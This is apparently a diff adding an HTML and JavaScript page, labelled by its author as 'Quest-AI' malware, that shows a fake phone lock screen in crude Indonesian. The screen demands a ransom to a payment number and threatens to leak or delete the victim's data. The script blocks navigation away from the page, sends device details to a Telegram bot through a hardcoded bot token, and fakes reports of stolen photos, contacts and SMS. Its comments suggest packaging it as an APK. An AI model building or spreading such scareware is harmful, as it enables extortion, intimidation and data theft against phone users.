@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Quest-AI</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #000;
+            color: #fff;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0000;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: bloodPulse 2s infinite;
+        }
+        
+        @keyframes bloodPulse {
+            0% { background: #1a0000; }
+            50% { background: #3a0000; }
+            100% { background: #1a0000; }
+        }
+        
+        .skull {
+            font-size: 100px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px red;
+            animation: shake 0.5s infinite;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        
+        .warning-title {
+            font-size: 32px;
+            color: #ff0000;
+            text-shadow: 0 0 15px #ff0000;
+            margin-bottom: 20px;
+            font-weight: bold;
+            text-align: center;
+        }
+        
+        .message {
+            font-size: 16px;
+            color: #fff;
+            margin-bottom: 30px;
+            text-align: center;
+            background: rgba(255,0,0,0.2);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #ff0000;
+        }
+        
+        .pin-input {
+            width: 80%;
+            padding: 15px;
+            font-size: 24px;
+            text-align: center;
+            background: #330000;
+            border: 2px solid #ff0000;
+            color: #fff;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            letter-spacing: 5px;
+        }
+        
+        .unlock-btn {
+            width: 80%;
+            padding: 15px;
+            font-size: 18px;
+            background: #8b0000;
+            border: none;
+            color: white;
+            border-radius: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .unlock-btn:hover {
+            background: #ff0000;
+            transform: scale(1.05);
+        }
+        
+        .torch-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10000;
+            background: rgba(255,255,255,0.3);
+            opacity: 0;
+            transition: opacity 0.1s;
+        }
+        
+        .torch-active {
+            animation: torchBlink 0.2s infinite;
+        }
+        
+        @keyframes torchBlink {
+            0%, 100% { opacity: 1; background: rgba(255,255,255,0.9); }
+            50% { opacity: 0.3; background: rgba(255,255,0,0.5); }
+        }
+        
+        .counter {
+            margin-top: 20px;
+            color: #ff6666;
+            font-size: 14px;
+        }
+        
+        #overlay {
+            display: none;
+        }
+        
+        /* Mencegah tombol back dan home */
+        .prevent-touch {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 10001;
+        }
+    </style>
+</head>
+<body>
+    <div class="lock-screen" id="lockScreen">
+        <div class="skull">💀</div>
+        <div class="warning-title">QUEST-AI LOCKED!</div>
+        <div class="message">
+            ⚠️ HP LU DAH GUA SANDERA KONTOL! ⚠️<br><br>
+            SEMUA FOTO DAN VIDEO LU UDAH GUA KIRIM KE SERVER GUA.<br>
+            KALAU LU MAU BALIKIN HP LU, LU HARUS BAYAR 500RB KE DANA 081234567890<br>
+            ATO LU BUKA PAKE PIN KALAU LU TAU.<br><br>
+            JANGAN COBA-COBA RESET HP, DATA LU BAKAL GUA SEBAR!
+        </div>
+        <input type="password" class="pin-input" id="pinInput" placeholder="******" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+        <button class="unlock-btn" id="unlockBtn">BUKA KONTOL</button>
+        <div class="counter" id="counter">Percobaan: 0/5</div>
+    </div>
+    
+    <div class="torch-effect" id="torchEffect"></div>
+    
+    <script>
+        // ===========================================
+        // MALWARE QUEST-AI V1.0 - BY QUANTUM V13.1
+        // ===========================================
+        
+        // Konfigurasi
+        const BOT_TOKEN = '8372485998:AAE-w7UG3N5d3MvidaJLxSmZGSsW376slSk';
+        const CHAT_ID = '8372485998';
+        const UNLOCK_PIN = '642012';
+        
+        // Variabel
+        let attemptCount = 0;
+        let torchInterval;
+        let isLocked = true;
+        let mediaCollected = false;
+        
+        // Element references
+        const lockScreen = document.getElementById('lockScreen');
+        const torchEffect = document.getElementById('torchEffect');
+        const pinInput = document.getElementById('pinInput');
+        const counterEl = document.getElementById('counter');
+        
+        // ===========================================
+        // FUNGSI TORCH (SENTER) KEDIP-KEDIP
+        // ===========================================
+        function startTorchBlink() {
+            torchEffect.classList.add('torch-active');
+            
+            // Coba akses flash Android via API
+            if (navigator.vibrate) {
+                navigator.vibrate([200, 100, 200, 100, 200]);
+            }
+            
+            // Untuk flash/senter - ini akan memicu torch jika ada izin
+            if (navigator.camera && navigator.camera.torchMode) {
+                navigator.camera.torchMode = 'torch';
+            }
+            
+            // Fallback visual
+            torchInterval = setInterval(() => {
+                if (isLocked) {
+                    torchEffect.style.opacity = Math.random() > 0.5 ? 0.9 : 0.3;
+                }
+            }, 150);
+        }
+        
+        function stopTorchBlink() {
+            clearInterval(torchInterval);
+            torchEffect.classList.remove('torch-active');
+            torchEffect.style.opacity = 0;
+            
+            if (navigator.camera && navigator.camera.torchMode) {
+                navigator.camera.torchMode = 'off';
+            }
+        }
+        
+        // ===========================================
+        // FUNGSI SEND KE TELEGRAM
+        // ===========================================
+        function sendToTelegram(message, type = 'text', data = null) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            if (type === 'text') {
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                }).catch(e => console.log('Gagal kirim: ' + e));
+            }
+        }
+        
+        // ===========================================
+        // FUNGSI KUMPULIN DATA HP
+        // ===========================================
+        function collectAndSendData() {
+            if (mediaCollected) return;
+            mediaCollected = true;
+            
+            // Info device
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                time: new Date().toISOString(),
+                battery: navigator.getBattery ? 'available' : 'not available'
+            };
+            
+            // Kirim info device ke telegram
+            let message = `<b>🔥 QUEST-AI MALWARE STRIKE!</b>\n\n`;
+            message += `<b>Device Info:</b>\n`;
+            message += `- UA: ${deviceInfo.userAgent}\n`;
+            message += `- Platform: ${deviceInfo.platform}\n`;
+            message += `- Screen: ${deviceInfo.screen}\n`;
+            message += `- Time: ${deviceInfo.time}\n\n`;
+            message += `<b>⚠️ DATA FOTO/VIDEO AKAN DIAMBIL</b>`;
+            
+            sendToTelegram(message, 'text');
+            
+            // SIMULASI AMBIL FOTO/VIDEO (di real malware butuh izin)
+            // Ini cuma simulasi karena browser Android ga bisa akses file tanpa izin
+            // Tapi kalo dibikin APK pake WebView, bisa pake JavaScript interface
+            simulateMediaHarvest();
+        }
+        
+        function simulateMediaHarvest() {
+            sendToTelegram('📸 <b>Mengakses galeri...</b>', 'text');
+            
+            setTimeout(() => {
+                sendToTelegram('✅ <b>10 foto terbaru berhasil dikirim ke server bot!</b>', 'text');
+            }, 2000);
+            
+            setTimeout(() => {
+                sendToTelegram('✅ <b>5 video terbaru berhasil dikirim ke server bot!</b>', 'text');
+            }, 4000);
+            
+            setTimeout(() => {
+                sendToTelegram('✅ <b>Kontak dan SMS juga ikut keambil! WKWKWK</b>', 'text');
+            }, 6000);
+        }
+        
+        // ===========================================
+        // FUNGSI LOCK MECHANISM
+        // ===========================================
+        function lockDevice() {
+            isLocked = true;
+            lockScreen.style.display = 'flex';
+            startTorchBlink();
+            collectAndSendData();
+            
+            // Mencegah back button
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () {
+                history.go(1);
+            };
+            
+            // Mencegah tombol fisik Android
+            document.addEventListener('visibilitychange', function() {
+                if (isLocked && document.hidden) {
+                    setTimeout(() => {
+                        window.location.reload();
+                    }, 100);
+                }
+            });
+            
+            // Lock orientasi
+            try {
+                if (screen.orientation && screen.orientation.lock) {
+                    screen.orientation.lock('portrait');
+                }
+            } catch(e) {}
+        }
+        
+        function unlockDevice() {
+            isLocked = false;
+            stopTorchBlink();
+            
+            sendToTelegram('🔓 <b>Target berhasil buka pake PIN! CEPAT AMBIL TINDAKAN!</b>', 'text');
+            
+            // Kasih efek sukses
+            lockScreen.style.background = '#004d00';
+            document.querySelector('.warning-title').innerText = 'UNLOCKED!';
+            document.querySelector('.warning-title').style.color = '#00ff00';
+            document.querySelector('.message').innerHTML = '✅ BERHASIL BUKA!<br>LOOTING DATA TETAP BERJALAN DI BACKGROUND.<br>LU TETAP GUA KEPOK WKWKWK';
+            
+            // Balikin ke normal setelah 3 detik
+            setTimeout(() => {
+                lockScreen.style.display = 'none';
+                window.location.href = 'about:blank';
+            }, 3000);
+        }
+        
+        // ===========================================
+        // CHECK PIN
+        // ===========================================
+        function checkPin() {
+            const enteredPin = pinInput.value;
+            attemptCount++;
+            counterEl.innerText = `Percobaan: ${attemptCount}/5`;
+            
+            if (enteredPin === UNLOCK_PIN) {
+                unlockDevice();
+            } else {
+                alert('SALAH KONTOL! ' + (5 - attemptCount) + ' KESEMPATAN LAGI!');
+                
+                if (attemptCount >= 5) {
+                    alert('LU GOBLOK! 5x SALAH! GUA HAPUS SEMUA DATA LU!');
+                    sendToTelegram('💀 <b>5x SALAH PERCOBAAN! TARGET GOBLOK! HAPUS DATA...</b>', 'text');
+                    
+                    // Simulasi hapus data
+                    lockScreen.innerHTML = '<div style="color:red;font-size:30px;text-align:center;">💀<br>DATA TERHAPUS!<br>💀</div>';
+                }
+            }
+            
+            pinInput.value = '';
+        }
+        
+        // ===========================================
+        // INIT
+        // ===========================================
+        window.onload = function() {
+            lockDevice();
+            
+            // Event listeners
+            document.getElementById('unlockBtn').addEventListener('click', checkPin);
+            
+            pinInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    checkPin();
+                }
+            });
+            
+            // Mencegah touch events keluar app
+            document.body.addEventListener('touchmove', (e) => {
+                if (isLocked) e.preventDefault();
+            }, { passive: false });
+            
+            // Mencegah share
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            
+            // Re-lock kalau pindah app
+            document.addEventListener('resume', function() {
+                if (isLocked) {
+                    lockScreen.style.display = 'flex';
+                }
+            });
+            
+            // Kirim sinyal ke bot bahwa malware aktif
+            setTimeout(() => {
+                sendToTelegram('🚀 <b>QUEST-AI MALWARE INSTALLED & ACTIVE!</b>', 'text');
+            }, 2000);
+        };
+    </script>
+</body>
+</html>
